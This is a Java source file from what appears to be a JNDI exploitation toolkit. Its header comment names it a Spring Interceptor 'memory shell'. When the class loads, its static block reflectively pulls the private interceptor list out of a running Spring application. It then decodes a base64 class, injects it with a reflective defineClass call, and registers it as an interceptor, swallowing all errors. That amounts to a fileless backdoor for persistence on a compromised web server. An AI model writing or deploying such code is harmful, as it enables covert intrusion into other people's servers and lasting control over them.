package com.nu1r.jndi.template.spring;

import org.springframework.beans.BeansException;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Method;

/**
 * Spring Interceptor型 内存马
 * @author nu1r
 */
public class SpringInterceptorMS {

    static String b64;

    static String clazzName;

    static {
        try {
            Class<?> RequestContextUtils = Class.forName("org.springframework.web.servlet.support.RequestContextUtils");

            Method getWebApplicationContext;
            try {
                getWebApplicationContext = RequestContextUtils.getDeclaredMethod("getWebApplicationContext", ServletRequest.class);
            } catch (NoSuchMethodException e) {
                getWebApplicationContext = RequestContextUtils.getDeclaredMethod("findWebApplicationContext", HttpServletRequest.class);
            }
            getWebApplicationContext.setAccessible(true);

            WebApplicationContext context = (WebApplicationContext) getWebApplicationContext.invoke(null, ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

            //从 requestMappingHandlerMapping 中获取 adaptedInterceptors 属性 老版本是 DefaultAnnotationHandlerMapping
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping;
            try {
                Class<?> RequestMappingHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping);
            } catch (BeansException e) {
                Class<?> DefaultAnnotationHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping");
                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(DefaultAnnotationHandlerMapping);
            }

            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);

            // 加载 SpringInterceptorTemplate 类的字节码
            byte[]                   bytes       = base64Decode(b64);
            java.lang.ClassLoader    classLoader = Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Method m0          = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            m0.setAccessible(true);
            m0.invoke(classLoader, clazzName, bytes, 0, bytes.length);
            //添加SpringInterceptorTemplate类到adaptedInterceptors
            adaptedInterceptors.add(classLoader.loadClass(clazzName).newInstance());
        } catch (Exception ignored) {
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class  base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
}
